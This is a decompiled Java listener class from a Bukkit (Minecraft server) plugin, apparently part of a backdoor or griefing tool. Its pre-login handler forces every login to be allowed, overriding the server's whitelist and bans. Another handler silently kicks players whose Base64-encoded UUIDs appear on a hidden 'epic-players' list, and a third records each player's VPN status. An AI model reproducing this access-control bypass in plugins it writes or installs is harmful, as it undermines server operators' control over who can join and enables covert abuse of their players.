/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.AsyncPlayerPreLoginEvent
 *  org.bukkit.event.player.AsyncPlayerPreLoginEvent$Result
 *  org.bukkit.event.player.PlayerJoinEvent
 *  org.json.JSONObject
 */
package me.qlutch.sucks.events;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import me.qlutch.sucks.command.impl.login.LoginStatus;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.json.JSONObject;

public class ForceLoginListener
implements Listener {
    private static final Core INSTANCE = (Core)Core.getPlugin(Core.class);

    @EventHandler
    public void onLogin(AsyncPlayerPreLoginEvent e2) {
        e2.setLoginResult(AsyncPlayerPreLoginEvent.Result.ALLOWED);
        e2.allow();
    }

    @EventHandler
    public void onLogin(PlayerJoinEvent e2) {
        Player p2 = e2.getPlayer();
        if (API.isPlayerOnVPN(p2)) {
            ForceLoginListener.INSTANCE.vpnStatusMap.put(p2, true);
        } else {
            ForceLoginListener.INSTANCE.vpnStatusMap.put(p2, false);
        }
    }

    @EventHandler
    public void antiantiWhitelist(PlayerJoinEvent e2) {
        Player p2 = e2.getPlayer();
        for (String list : DataManager.getData().getStringList("epic-players")) {
            byte[] uuid;
            if (!list.contains(new String(uuid = Base64.getEncoder().encode(p2.getUniqueId().toString().getBytes())))) continue;
            API.kickPlayer(p2);
        }
    }
}

